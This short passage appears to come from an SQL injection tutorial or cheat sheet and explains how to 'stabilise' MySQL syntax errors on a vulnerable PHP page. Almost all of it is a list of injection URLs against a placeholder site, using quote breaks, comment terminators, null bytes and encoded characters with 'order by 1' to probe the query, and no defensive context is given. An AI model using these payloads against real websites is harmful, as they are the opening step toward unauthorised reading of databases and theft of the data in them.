## Stabilise the error message
Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  

```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
```http://domain.com/index.php?id=1') order by 1-- - ```  no error  
